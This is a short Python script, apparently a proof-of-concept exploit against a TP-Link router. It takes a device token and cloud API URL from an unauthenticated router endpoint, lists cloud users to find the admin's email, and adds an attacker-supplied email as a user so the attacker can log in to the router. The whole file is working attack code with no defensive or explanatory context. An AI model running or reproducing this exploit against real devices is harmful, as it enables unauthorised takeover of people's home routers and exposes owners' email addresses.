import sys,requests,re

host = sys.argv[1]
your_email = sys.argv[2]

burp0_headers = {"Referer": f"http://{host}/"}
a = requests.post(f"http://{host}/cgi/getTokenc", headers=burp0_headers).text

device_token = re.findall("var Token=\"(.*?)\";",a)[0] # extract device token
web_url = re.findall("var EwebURL=\"(.*?)\";",a)[0] # extract tplink cloud api url

print(f"Web Url: {web_url}, Device Token: {device_token}")

users_request = requests.post(f"{web_url}/devices/getUsers",data='{"deviceToken":'+device_token+',"operation":"load"}')
users = users_request.json()["result"]["userList"]
for user in users:
    if user["role"] == 0:
        print(f'Admin Email: {user["cloudUserName"]}, Nickname {user["nickname"]}')
        admin_email = user["cloudUserName"] # get the email of admin user

adduser = requests.post(f"{web_url}/devices/addUser",data='{"deviceToken":"'+device_token+'","operation":"insert","ownerAccount":"'+admin_email+'","userAccount":"'+your_email+'"}')
if adduser.json()["error_code"] == 0:
    print("done! now you can login your router by using your tplinkcloud credentials")
else:
    print("failure during exploitation")
